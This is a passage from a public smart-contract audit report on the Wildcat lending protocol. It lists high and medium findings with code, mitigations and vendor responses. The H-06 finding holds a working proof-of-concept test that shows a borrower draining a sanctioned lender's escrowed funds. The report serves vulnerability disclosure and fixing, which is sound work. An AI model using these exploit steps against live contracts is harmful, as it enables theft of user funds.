        //@audit => If the lender address is not found in the _authorizedLenders variable, it will forward a false to the Market::updateAccountAuthorization() function
      WildcatMarket(market).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));
    }
  }
```

**EnumerableSet.sol**

```solidity
function contains(AddressSet storage set, address value) internal view returns (bool) {
    //@audit-info => Calls the internal _contains()
    //@audit-info => If the given value is found it will return true, otherwise it will return false!
    return _contains(set._inner, bytes32(uint256(uint160(value))));
}

//@audit-info => The internal function will just return a true or false if the given value is in the set or not, but the tx won't be reverted!
/**
* @dev Returns true if the value is in the set. O(1).
*/
function _contains(Set storage set, bytes32 value) private view returns (bool) {
    return set._indexes[value] != 0;
}
```

**WildcatMarketConfig.sol**

```solidity
  function updateAccountAuthorization(
    address _account,
    //@audit-info => For any account that is not registered in the `_authorizedLenders` of the Controller, this flag was set as false!
    bool _isAuthorized
  ) external onlyController nonReentrant {
    MarketState memory state = _getUpdatedState();
    //@audit-info => If the accountAddress is not registered in the storage, the approval role is set to Null
    //@audit-info => If the account has been blacklisted, tx will revert!
    Account memory account = _getAccount(_account);
    if (_isAuthorized) {
      account.approval = AuthRole.DepositAndWithdraw;
    
    //@audit => Any account not registered in the Controller will be assigned the WithdrawOnly role.
    } else {
      account.approval = AuthRole.WithdrawOnly;
    }
    _accounts[_account] = account;
    _writeState(state);
    emit AuthorizationStatusUpdated(_account, account.approval);
  }
```

At this point, the Lender has been able to move their MarketTokens to different accounts and to grant the `WithdrawOnly` Role to all of the accounts they wish to.

Now, they can decide to exit the Market by queuing and executing some withdrawal requests from the different accounts where the MarketTokens were moved. Any of those accounts have now the `WithdrawOnly` Role and have a balance of MarketTokens, so the Lender will be able to exit the market from any of those accounts.

### Recommended Mitigation Steps

The mitigation for this problem is very straight-forward, by limiting the access to which entities can call the [`WildcatMarketController::updateLenderAuthorization()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L182-L190); either only allow the Borrower to call it, or create a type of whitelist of valid actors who are capable of updating the lender's authorization on the Markets. In this way, the Lenders won't be capable of granting the `WithdrawOnly` Role to any account they want to; thus, they won't be able even to attempt to escape the sanctions.

**WildcatMarketController.sol**

```solidity
- function updateLenderAuthorization(address lender, address[] memory markets) external {
+ function updateLenderAuthorization(address lender, address[] memory markets) external onlyAuthorizedEntities(){
    for (uint256 i; i < markets.length; i++) {
      address market = markets[i];
      if (!_controlledMarkets.contains(market)) {
        revert NotControlledMarket();
      }
      WildcatMarket(market).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));
    }
  }

modifier onlyAuthorizedEntities() {
    require(msg.sender == <authorizedEntities>, "you are not allowed sir");
    _;
}
```

### Assessed type

Context

**[0xTheC0der (judge) increased severity to High](https://github.com/code-423n4/2023-10-wildcat-findings/issues/266#issuecomment-1798673899)**

**[laurenceday (Wildcat) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/266#issuecomment-1803367980):**
 > Mitigated [here](https://github.com/wildcat-finance/wildcat-protocol/pull/57/commits/2259d2a5f99c64d53d775e514ae0696bc2debb6c).

**[laurenceday (Wildcat) confirmed](https://github.com/code-423n4/2023-10-wildcat-findings/issues/266#issuecomment-1810752119)**

***

## [[H-06] Borrower can drain all funds of a sanctioned lender](https://github.com/code-423n4/2023-10-wildcat-findings/issues/68)
*Submitted by [YusSecurity](https://github.com/code-423n4/2023-10-wildcat-findings/issues/68), also found by [d3e4](https://github.com/code-423n4/2023-10-wildcat-findings/issues/689), [serial-coder](https://github.com/code-423n4/2023-10-wildcat-findings/issues/630), [nirlin](https://github.com/code-423n4/2023-10-wildcat-findings/issues/628), [xeros](https://github.com/code-423n4/2023-10-wildcat-findings/issues/610), [VAD37](https://github.com/code-423n4/2023-10-wildcat-findings/issues/575), [DeFiHackLabs](https://github.com/code-423n4/2023-10-wildcat-findings/issues/556), [0xKbl](https://github.com/code-423n4/2023-10-wildcat-findings/issues/551), [0xDING99YA](https://github.com/code-423n4/2023-10-wildcat-findings/issues/546), [Aymen0909](https://github.com/code-423n4/2023-10-wildcat-findings/issues/543), [ast3ros](https://github.com/code-423n4/2023-10-wildcat-findings/issues/515), [Yanchuan](https://github.com/code-423n4/2023-10-wildcat-findings/issues/493), [MiloTruck](https://github.com/code-423n4/2023-10-wildcat-findings/issues/492), [AS](https://github.com/code-423n4/2023-10-wildcat-findings/issues/446), [sl1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/440), [QiuhaoLi](https://github.com/code-423n4/2023-10-wildcat-findings/issues/407), [gizzy](https://github.com/code-423n4/2023-10-wildcat-findings/issues/389), [SovaSlava](https://github.com/code-423n4/2023-10-wildcat-findings/issues/384), [TrungOre](https://github.com/code-423n4/2023-10-wildcat-findings/issues/353), [cartlex\_](https://github.com/code-423n4/2023-10-wildcat-findings/issues/311), [kodyvim](https://github.com/code-423n4/2023-10-wildcat-findings/issues/307), [Vagner](https://github.com/code-423n4/2023-10-wildcat-findings/issues/301), [KeyKiril](https://github.com/code-423n4/2023-10-wildcat-findings/issues/297), [GREY-HAWK-REACH](https://github.com/code-423n4/2023-10-wildcat-findings/issues/227), [0xSwahili](https://github.com/code-423n4/2023-10-wildcat-findings/issues/222), [ggg\_ttt\_hhh](https://github.com/code-423n4/2023-10-wildcat-findings/issues/197), [3docSec](https://github.com/code-423n4/2023-10-wildcat-findings/issues/190), [Silvermist](https://github.com/code-423n4/2023-10-wildcat-findings/issues/189), [0xbepresent](https://github.com/code-423n4/2023-10-wildcat-findings/issues/164), [tallo](https://github.com/code-423n4/2023-10-wildcat-findings/issues/163), [ZdravkoHr](https://github.com/code-423n4/2023-10-wildcat-findings/issues/114), [0xCiphky](https://github.com/code-423n4/2023-10-wildcat-findings/issues/82), [rvierdiiev](https://github.com/code-423n4/2023-10-wildcat-findings/issues/77), [nobody2018](https://github.com/code-423n4/2023-10-wildcat-findings/issues/55), [deth](https://github.com/code-423n4/2023-10-wildcat-findings/issues/444), and [0xAsen](https://github.com/code-423n4/2023-10-wildcat-findings/issues/299)*

### Lines of code

<https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/WildcatSanctionsSentinel.sol#L96-L97><br>
<https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarketBase.sol#L173-L174><br>
<https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L166-L170>

### Impact

The `WildcatMarketBase#_blockAccount()` function that is used to block a sanctioned lender contains a critical bug. It incorrectly calls `IWildcatSanctionsSentinel(sentinel).createEscrow()` with misordered arguments, accidentally creating a vulnerable escrow that enables the borrower to drain all the funds of the sanctioned lender.

The execution of withdrawals (`WildcatMarketWithdrawals#executeWithdrawal()`) also performs a check if the `accountAddress` is sanctioned and if it is, then escrow is created and the amount that was to be sent to the lender is sent to the escrow. That escrow, however, is also created with the `account` and `borrower` arguments in the wrong order.

That means whether or not the borrower has anything to do with a sanctioned account and their funds ever, that account will never be able to get their money back in case their sanction gets dismissed.

### Proof of Concept

Consider this scenario to illustrate how the issue can be exploited:
1.  Bob The Borrower creates a market.
2.  Bob authorizes Larry The Lender as a lender in the created market.
3.  Larry deposits funds into the market.
4.  Larry gets sanctioned in Chainalysis.
5.  Bob invokes `WildcatMarket#nukeFromOrbit(larryAddress)`, blocking Larry and creating a vulnerable `WildcatSanctionsEscrow` where Larry's market tokens are transferred.
6.  Bob authorizes himself as a lender in the market via `WildcatMarketController#authorizeLenders(bobAddress)`.
7.  Bob initiates a withdrawal using  `WildcatMarket#queueWithdrawal()`.
8.  After the withdrawal batch duration expires, Bob calls `WildcatMarket#executeWithdrawal()` and gains access to all of Larry's assets.

Now, let's delve into the specifics and mechanics of the vulnerability:

The `nukeFromOrbit()` function calls `_blockAccount(state, larryAddress)`, blocking Larry's account, creating an escrow, and transferring his market tokens to that escrow.

```solidity
//@audit                                                     Larry
//@audit                                                       â†“
function _blockAccount(MarketState memory state, address accountAddress) internal {
  Account memory account = _accounts[accountAddress];
  // ...
  account.approval = AuthRole.Blocked;
  // ...
  account.scaledBalance = 0;
  address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(
	accountAddress, //@audit â† Larry
	borrower,       //@audit â† Bob
	address(this)
  );
  // ...
  _accounts[escrow].scaledBalance += scaledBalance;
  // ...
}
```

In the code snippet, notice the order of arguments passed to `createEscrow()`:

```solidity
createEscrow(accountAddress, borrower, address(this));
```

However, when we examine the `WildcatSanctionsSentinel#createEscrow()` implementation, we see a different order of arguments. This results in an incorrect construction of `tmpEscrowParams`:

```solidity
function createEscrow(
	address borrower, //@audit â† Larry
	address account,  //@audit â† Bob
	address asset
) public override returns (address escrowContract) {
  // ...
  // @audit                        ( Larry  ,   Bob  , asset)
  // @audit                            â†“         â†“       â†“
  tmpEscrowParams = TmpEscrowParams(borrower, account, asset);
  new WildcatSanctionsEscrow{ salt: keccak256(abi.encode(borrower, account, asset)) }();
  // ...
}
```

The `tmpEscrowParams` are essential for setting up the escrow correctly. They are fetched in the constructor of `WildcatSanctionsEscrow`, and the order of these parameters is significant:

```solidity
constructor() {
  sentinel = msg.sender;  
  (borrower, account, asset) = WildcatSanctionsSentinel(sentinel).tmpEscrowParams();
//     â†‘        â†‘       â†‘   
//(  Larry ,   Bob  , asset) are the params fetched here. @audit
}
```

However, due to the misordered arguments in `_blockAccount()`, what's passed as `tmpEscrowParams` is `(borrower = Larry, account = Bob, asset)`, which is incorrect. This misordering affects the `canReleaseEscrow()` function, which determines whether `releaseEscrow()` should proceed or revert.

```solidity
function canReleaseEscrow() public view override returns (bool) {
	//@audit                                                 Larry      Bob
	//                                                         â†“         â†“
	return !WildcatSanctionsSentinel(sentinel).isSanctioned(borrower, account);
}
```

The misordered parameters impact the return value of `sentinel.isSanctioned()`. It mistakenly checks Bob against the sanctions list, where he is not sanctioned.

```solidity
//@audit                       Larry              Bob
//                               â†“                 â†“
function isSanctioned(address borrower, address account) public view override returns (bool) {
 return
   !sanctionOverrides[borrower][account] && // true
   IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account); // false
}
```

Thus `isSanctioned()` returns `false` and consequently `canReleaseEscrow()` returns `true`. This allows Bob to successfully execute `releaseEscrow()` and drain all of Larry's market tokens:

```solidity
function releaseEscrow() public override {
  if (!canReleaseEscrow()) revert CanNotReleaseEscrow();

  uint256 amount = balance();
  
  //@audit                 Bob   Larry's $
  //                        â†“       â†“
  IERC20(asset).transfer(account, amount);

  emit EscrowReleased(account, asset, amount);
}
```

After this, Bob simply needs to authorize himself as a lender in his own market and withdraw the actual assets.

Below is a PoC demonstrating how to execute the exploit. To proceed, please include the following import statements in `test/market/WildcatMarketConfig.t.sol`:

```solidity
import 'src/WildcatSanctionsEscrow.sol';

import "forge-std/console2.sol";
```

Add the following test `test/market/WildcatMarketConfig.t.sol` as well:

```solidity
function test_borrowerCanStealSanctionedLendersFunds() external {
  vm.label(borrower, "bob"); // Label borrower for better trace readability

  // This is Larry The Lender
  address larry = makeAddr("larry");

  // Larry deposists 10e18 into Bob's market
  _deposit(larry, 10e18);

  // Larry's been a bad guy and gets sanctioned
  sanctionsSentinel.sanction(larry);

  // Larry gets nuked by the borrower
  vm.prank(borrower);
  market.nukeFromOrbit(larry);

  // The vulnerable escrow in which Larry's funds get moved
  address vulnerableEscrow = sanctionsSentinel.getEscrowAddress(larry, borrower, address(market));
  vm.label(vulnerableEscrow, "vulnerableEscrow");

  // Ensure Larry's funds have been moved to his escrow
  assertEq(market.balanceOf(larry), 0);
  assertEq(market.balanceOf(vulnerableEscrow), 10e18);

  // Malicious borrower is able to release the escrow due to the vulnerability
  vm.prank(borrower);
  WildcatSanctionsEscrow(vulnerableEscrow).releaseEscrow();

  // Malicious borrower has all of Larry's tokens
  assertEq(market.balanceOf(borrower), 10e18);

  // The borrower authorizes himself as a lender in the market
  _authorizeLender(borrower);

  // Queue withdrawal of all funds
  vm.prank(borrower);
  market.queueWithdrawal(10e18);

  // Fast-forward to when the batch duration expires
  fastForward(parameters.withdrawalBatchDuration);
  uint32 expiry = uint32(block.timestamp);

  // Execute the withdrawal
  market.executeWithdrawal(borrower, expiry);

  // Assert the borrower has drained all of Larry's assets
  assertEq(asset.balanceOf(borrower), 10e18);
}
```

Run the PoC like this:

```sh
forge test --match-test test_borrowerCanStealSanctionedLendersFunds -vvvv
```

### Recommended Mitigation Steps

Fix the order of parameters in `WildcatSanctionsSentinel#createEscrow(borrower, account, asset)`:

```diff
  function createEscrow(
-   address borrower,
+   address account,
-   address account,
+   address borrower,
    address asset
  ) public override returns (address escrowContract) {
```

### Assessed type

Error

**[laurenceday (Wildcat) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/68#issuecomment-1803354649):**
 > Mitigated [here](https://github.com/wildcat-finance/wildcat-protocol/pull/57/commits/2e111fc1f20d707eb78ac8a34eac4f751f6da474).

**[laurenceday (Wildcat) confirmed](https://github.com/code-423n4/2023-10-wildcat-findings/issues/68#issuecomment-1810740649)**

***

# Medium Risk Findings (10)
## [[M-01] When a batch of withdrawals expires, that batch is often underpaid their owed interest](https://github.com/code-423n4/2023-10-wildcat-findings/issues/644)
*Submitted by [Toshii](https://github.com/code-423n4/2023-10-wildcat-findings/issues/644), also found by [Yanchuan](https://github.com/code-423n4/2023-10-wildcat-findings/issues/455) and [caventa](https://github.com/code-423n4/2023-10-wildcat-findings/issues/414)*

### Lines of code

<https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L361-L376><br>
<https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L466-L492>

### Impact

Until the exact timestamp that a payment is processed for a given withdrawal batch (`batch.scaledAmountBurned` incremented, `batch.normalizedAmountPaid` incremented), the underlying amount of that batch should continue to be earning interest. It's only when the payment is actually made that the underlying amount of the batch should stop earning interest - at this point users in that batch are actually able to withdraw funds. This is clear with the general flow of logic of how `_applyWithdrawalBatchPayment` is being called.

This flow is not being followed when a batch of withdrawals first expires. Instead of getting paid interest up until the current `block.timestamp`, they are only paid interest up to the timestamp of the expiry. This means, (assuming theres enough assets currently in the market to pay off that batch of withdrawals) users in that batch are unfairly losing out on (`block.timestamp` - expiry) the duration of interest. As this duration increases, those lenders are losing increasing amounts of interest.

### Proof of Concept

The logic for handling a withdrawal batch when it first expires occurs in the `WildcatMarketBase:_getUpdatedState` function, which is defined as follows:

```solidity
function _getUpdatedState() internal returns (MarketState memory state) {
  state = _state;
  // Handle expired withdrawal batch
  if (state.hasPendingExpiredBatch()) {
    uint256 expiry = state.pendingWithdrawalExpiry;
    // Only accrue interest if time has passed since last update.
    // This will only be false if withdrawalBatchDuration is 0.
    if (expiry != state.lastInterestAccruedTimestamp) {
      (uint256 baseInterestRay, uint256 delinquencyFeeRay, uint256 protocolFee) = state
        .updateScaleFactorAndFees(
          protocolFeeBips,
          delinquencyFeeBips,
          delinquencyGracePeriod,
          expiry // @issue
        );
      emit ScaleFactorUpdated(state.scaleFactor, baseInterestRay, delinquencyFeeRay, protocolFee);
    }
    _processExpiredWithdrawalBatch(state);
  }
  ...
}
```

Effectively, the market parameters related to the accrued interest owed to lenders (most important of which is `state.scaleFactor`) is updated in the `state.updateScaleFactorAndFees(..)` call, which we can see updates the interest up to the `expiry` timestamp. Let's consider a scenario where `state.lastInterestAccruedTimestamp` = N, `expiry`= N, and `block.timestamp`= N+`86_400` (one day). At this point in time, all lenders in this market (including lenders in this expiring withdrawal batch) are owed interest for N+`86_400`-N = `86_400`, which is the duration from the current `block.timestamp` to the previous timestamp that interest was accrued.

Considering this, in the above function call, `(expiry != state.lastInterestAccruedTimestamp)`= False and so it is skipped. However, even if `expiry` = N+1 for example, and it is not skipped, there is still a fundamental issue. For simplicity, I'm just assuming `expiry` = N. Next, `_processExpiredWithdrawalBatch` is called, which is defined as follows:

```solidity
function _processExpiredWithdrawalBatch(MarketState memory state) internal {
  uint32 expiry = state.pendingWithdrawalExpiry;
  WithdrawalBatch memory batch = _withdrawalData.batches[expiry];

  // Burn as much of the withdrawal batch as possible with available liquidity.
  uint256 availableLiquidity = batch.availableLiquidityForPendingBatch(state, totalAssets());
  if (availableLiquidity > 0) {
    _applyWithdrawalBatchPayment(batch, state, expiry, availableLiquidity);
  }
  ...
}
```

Here, let's assume that the borrower has left enough assets in the Market so that the entire withdrawal batch which just expired can be paid out in full. This logic is implemented in the `_applyWithdrawalBatchPayment` function, which is defined as follows:

```solidity
function _applyWithdrawalBatchPayment(
  WithdrawalBatch memory batch,
  MarketState memory state,
  uint32 expiry,
  uint256 availableLiquidity
) internal {
  uint104 scaledAvailableLiquidity = state.scaleAmount(availableLiquidity).toUint104();
  uint104 scaledAmountOwed = batch.scaledTotalAmount - batch.scaledAmountBurned;
  // Do nothing if batch is already paid
  if (scaledAmountOwed == 0) {
    return;
  }
  uint104 scaledAmountBurned = uint104(MathUtils.min(scaledAvailableLiquidity, scaledAmountOwed));
  uint128 normalizedAmountPaid = state.normalizeAmount(scaledAmountBurned).toUint128();

  batch.scaledAmountBurned += scaledAmountBurned;
  batch.normalizedAmountPaid += normalizedAmountPaid;
  state.scaledPendingWithdrawals -= scaledAmountBurned;

  // Update normalizedUnclaimedWithdrawals so the tokens are only accessible for withdrawals.
  state.normalizedUnclaimedWithdrawals += normalizedAmountPaid;
  ...
}
```

The important thing to note here is that the `normalizedAmountPaid` is based on referencing the current `state.scaleFactor`. However, this `state.scaleFactor` does not include the `86_400` seconds of interest which is actually owed to the lenders in this withdrawal batch. Rather, they are being cheated out of this interest entirely.

### Recommended Mitigation Steps

It is not logical that the most recent expired batch only get paid interest up to the expiry. Instead, they should be getting the full amount of interest up to the amount of time they are paid. The `WildcatMarketBase:_getUpdatedState` function should be changed accordingly:

```solidity
function _getUpdatedState() internal returns (MarketState memory state) {
  state = _state;

  if (block.timestamp != state.lastInterestAccruedTimestamp) {
    (uint256 baseInterestRay, uint256 delinquencyFeeRay, uint256 protocolFee) = state
      .updateScaleFactorAndFees(
        protocolFeeBips,
        delinquencyFeeBips,
        delinquencyGracePeriod,
        block.timestamp
      );
    emit ScaleFactorUpdated(state.scaleFactor, baseInterestRay, delinquencyFeeRay, protocolFee);
  }

  // Handle expired withdrawal batch
  if (state.hasPendingExpiredBatch()) {
    _processExpiredWithdrawalBatch(state);
  }
}
```

**[d1ll0n (Wildcat) acknowledged](https://github.com/code-423n4/2023-10-wildcat-findings/issues/644#issuecomment-1794598752)**

***

## [[M-02] Blocked accounts keep earning interest contrary to the WhitePaper](https://github.com/code-423n4/2023-10-wildcat-findings/issues/550)
*Submitted by [osmanozdemir1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/550), also found by [QiuhaoLi](https://github.com/code-423n4/2023-10-wildcat-findings/issues/733), [Infect3d](https://github.com/code-423n4/2023-10-wildcat-findings/issues/651), [crunch](https://github.com/code-423n4/2023-10-wildcat-findings/issues/416), [0xCiphky](https://github.com/code-423n4/2023-10-wildcat-findings/issues/402), [circlelooper](https://github.com/code-423n4/2023-10-wildcat-findings/issues/392), [Jiamin](https://github.com/code-423n4/2023-10-wildcat-findings/issues/286), [0xStalin](https://github.com/code-423n4/2023-10-wildcat-findings/issues/273), [Juntao](https://github.com/code-423n4/2023-10-wildcat-findings/issues/187), [rvierdiiev](https://github.com/code-423n4/2023-10-wildcat-findings/issues/123), and [HChang26](https://github.com/code-423n4/2023-10-wildcat-findings/issues/65)*

### Lines of code

<https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarketConfig.sol#L79><br>
<https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarketBase.sol#L178>

### Proof of Concept

Lenders might be flagged as sanctioned by the ChainAnalysis oracle and these lenders can be blocked with the `nukeFromOrbit()` function or during a withdrawal execution. Both of these functions will call the internal `_blockAccount()` function.

<https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarketBase.sol#L163>

```solidity
  function _blockAccount(MarketState memory state, address accountAddress) internal {

      // skipped for brevity
@>    if (scaledBalance > 0) {
        account.scaledBalance = 0;
        address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(
          accountAddress,
          borrower,
          address(this)
        );
        emit Transfer(accountAddress, escrow, state.normalizeAmount(scaledBalance));
@>      _accounts[escrow].scaledBalance += scaledBalance;
        
      // skipped for brevity
    }
  }
```

As we can see above, if the user's scaled balance is greater than zero, an escrow contract is created for market tokens and the scaled token balance is transferred to the escrow contract.

In this protocol, there are two types of tokens: Underlying tokens, and market tokens. Market tokens are used for internal balance accounting and it is tracked with `scaled balances`. Underlying tokens are tracked with `normalized balances`. `scaleFactor` is the value that provides accumulated interest, and increment with every state update. `scaled balances` are multiplied by the `scaleFactor` and this will provide the `normalized balances`.

- Scaled balances do earn interest.
- Normalized balances do not earn interest.

According to the protocol's [WhitePaper](https://github.com/wildcat-finance/wildcat-whitepaper/blob/main/whitepaper_v0.2.pdf) (*page 16*), blocked accounts should not earn interest. 
> "The effect of this would be that an auxiliary escrow contract is deployed and the debt obligation of the borrower towards the lender is transferred to this new contract. ***Interest does not accrue within this contract*** *from the time the debt is transferred, and the borrower is expected to immediately return the balance of funds due up to that time to the escrow contract."*

However, because the escrow contract holds scaled balances, these funds will keep earning interest. These scaled balances will be normalized when the funds are released (after the sanction is removed) according to that date's `scaleFactor`.

Note: There might be two escrow contracts for the same lender if it is triggered during a withdrawal request. One with market tokens and the other with underlying tokens. The one with underlying tokens does not earn interest as expected. However, the escrow with the market tokens will still keep earning interest. I believe a blocked account earning interest contradicts the idea of the blocking.

### Recommended Mitigation Steps

I think all of the scaled balances should be normalized before transferring to the escrow contract to stop earning interest.

### Assessed type

Context

**[laurenceday (Wildcat) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/550#issuecomment-1803381902):**
 > Error in whitepaper. Acknowledged (and embarrassing) but won't fix.
> 
> Needs to account for growth in the event that the sanction is performed by a hostile (read: non-Chainalysis) actor in control of the oracle. Borrowers affected by this that are concerned about growth potential can close the market.

**[laurenceday (Wildcat) acknowledged](https://github.com/code-423n4/2023-10-wildcat-findings/issues/550#issuecomment-1810809810)**

*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-wildcat-findings/issues/550).*
***

## [[M-03] Protocol markets are incompatible with rebasing tokens](https://github.com/code-423n4/2023-10-wildcat-findings/issues/503)
*Submitted by [MiloTruck](https://github.com/code-423n4/2023-10-wildcat-findings/issues/503), also found by [0xStalin](https://github.com/code-423n4/2023-10-wildcat-findings/issues/729), [GREY-HAWK-REACH](https://github.com/code-423n4/2023-10-wildcat-findings/issues/653), [devival](https://github.com/code-423n4/2023-10-wildcat-findings/issues/606), [J4X](https://github.com/code-423n4/2023-10-wildcat-findings/issues/560), [DarkTower](https://github.com/code-423n4/2023-10-wildcat-findings/issues/260), [YusSecurity](https://github.com/code-423n4/2023-10-wildcat-findings/issues/98), and [InAllHonesty](https://github.com/code-423n4/2023-10-wildcat-findings/issues/71)*

Some tokens (eg. [AMPL](https://etherscan.io/token/0xd46ba6d942050d489dbd938a2c909a5d5039a161)), known as rebasing tokens, have dynamic balances. This means that the token balance of an address could increase or decrease over time.

However, markets in the protocol are unable to handle such changes in token balance. When lenders call `depositUpTo()`, the amount of assets they deposit is stored as a fixed amount in `account.scaledBalance`:

[WildcatMarket.sol#L56-L65](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L56-L65)

```solidity
    uint104 scaledAmount = state.scaleAmount(amount).toUint104();
    if (scaledAmount == 0) revert NullMintAmount();

    // Transfer deposit from caller
    asset.safeTransferFrom(msg.sender, address(this), amount);

    // Cache account data and revert if not authorized to deposit.
    Account memory account = _getAccountWithRole(msg.sender, AuthRole.DepositAndWithdraw);
    account.scaledBalance += scaledAmount;
    _accounts[msg.sender] = account;
```

Afterwards, when lenders want to withdraw their assets, the amount of assets that they can withdraw will be based off this value.

Therefore, since a lender's `scaledBalance` is fixed and does not change according to the underlying asset balance, lenders will lose funds if they deposit into a market with a rebasing token as the asset.

For example, if AMPL is used as the market's asset, and AMPL rebases to increase the token balance of all its users, lenders in the market will still only be able to withdraw the original amount they deposited multiplied by the market's interest rate. The underlying increase in AMPL will not accrue to anyone, and is only accessible by the borrower by calling [`borrow()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L111-L131).

### Impact

If a market uses a rebasing tokens as its asset, lenders will lose funds when the asset token rebases.

### Recommended Mitigation

Consider implementing a token blacklist in the protocol, such as in `WildcatArchController`, and adding all rebasing tokens to this blacklist.

Additionally, consider documenting that markets are not compatible with rebasing tokens.

### Assessed type

ERC20

**[laurenceday (Wildcat) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/503#issuecomment-1788179177):**
 > This is a Low that we can flag up to borrowers deploying. Not interested in maintaining a token whitelist or blacklist, as it goes against the point that we don't intervene.

**[0xTheC0der (judge) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/503#issuecomment-1800342262):**
 > 1. I cannot find any info within the scope of this audit that rebasing tokens are OOS or unsupported. Please let me know, in case I overlooked it.
> 2. Rebasing tokens, like `stETH` to name a "central" example, are no novelty in the DeFi space anymore and users expect DeFi protocols to be compatible with them when no further notice is provided.

*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-wildcat-findings/issues/503).*

***

## [[M-04] Calculation for lender withdrawals in `_applyWithdrawalBatchPayment()` should not round up](https://github.com/code-423n4/2023-10-wildcat-findings/issues/501)
*Submitted by [MiloTruck](https://github.com/code-423n4/2023-10-wildcat-findings/issues/501)*

After a lender calls [`queueWithdrawal()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L74-L121), the amount of assets allocated to a withdrawal batch is calculated  in `_applyWithdrawalBatchPayment()` as shown:

[WildcatMarketBase.sol#L510-L518](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L510-L518)

```solidity
    uint104 scaledAmountBurned = uint104(MathUtils.min(scaledAvailableLiquidity, scaledAmountOwed));
    uint128 normalizedAmountPaid = state.normalizeAmount(scaledAmountBurned).toUint128();

    batch.scaledAmountBurned += scaledAmountBurned;
    batch.normalizedAmountPaid += normalizedAmountPaid;
    state.scaledPendingWithdrawals -= scaledAmountBurned;

    // Update normalizedUnclaimedWithdrawals so the tokens are only accessible for withdrawals.
    state.normalizedUnclaimedWithdrawals += normalizedAmountPaid;
```

The calculation relies on [`normalizeAmount()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/libraries/MarketState.sol#L63-L71) to convert the amount of market tokens in a batch into assets.

However, as `normalizeAmount()` rounds up, it might cause the amount of assets allocated to a batch to be 1 higher than the correct amount. For example, if [`availableLiquidity`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L502) is `77e6` USDC, `normalizedAmount` could become `77e6 + 1` after calculation due to rounding.

This is problematic, as it causes `totalDebts()` to increase, causing the market to incorrectly become delinquent after `_applyWithdrawalBatchPayment()` is called although the borrower has transferred sufficient assets.

More specifically, if a [market's asset balance](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L238-L240) is equal to [`totalDebts()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/libraries/MarketState.sol#L138-L143), it should never be delinquent, regardless of what function is called, as the market has sufficient assets to cover the amount owed. However, due to the bug shown above, this could occur after a function such as `queueWithdrawal()` is called.

### Impact

A market could incorrectly become delinquent after `_applyWithdrawalBatchPayment()` is called.

This could cause a borrower to wrongly pay a higher interest rate; for example:

- Borrower calls `totalDebts()` to get the amount of assets owed.
- Borrower transfers the assets to the market and calls [`updateState()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L20-L29).
- Borrower assumes that the market is no longer delinquent.
- However, due to the bug above, the market becomes delinquent after a lender calls `queueWithdrawal()`.
- This activates the delinquency fee, causing the borrower to pay a higher interest rate.

Additionally, this bug also makes it possible for a market to become delinquent *after* it is closed through [`closeMarket()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L133-L161), which should not be possible.

### Proof of Concept

The code below contains two tests:

- `test_queueWithdrawalRoundingAffectsDelinquency()` demonstrates how rounding up in `_applyWithdrawalBatchPayment()` could make the market delinquent even when it should not be.
- `test_marketCanBecomeDelinquentAfterClosing()` shows how a market can become delinquent even after `closeMarket()` is called.

<details> 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

import 'src/WildcatArchController.sol';
import 'src/WildcatMarketControllerFactory.sol';

import 'forge-std/Test.sol';
import 'test/shared/TestConstants.sol';
import 'test/helpers/MockERC20.sol';

contract WithdrawalRoundingTest is Test {
    // Wildcat contracts
    WildcatMarketController controller;
    WildcatMarket market;
    
    // Test contracts
    MockERC20 asset = new MockERC20();

    // Users
    address AIKEN;
    address DUEET;

    function setUp() external {
        // Deploy Wildcat contracts
        WildcatArchController archController = new WildcatArchController();
        MarketParameterConstraints memory constraints = MarketParameterConstraints({
            minimumDelinquencyGracePeriod: MinimumDelinquencyGracePeriod,
            maximumDelinquencyGracePeriod: MaximumDelinquencyGracePeriod,
            minimumReserveRatioBips: 0,
            maximumReserveRatioBips: MaximumReserveRatioBips,
            minimumDelinquencyFeeBips: 0,
            maximumDelinquencyFeeBips: MaximumDelinquencyFeeBips,
            minimumWithdrawalBatchDuration: MinimumWithdrawalBatchDuration,
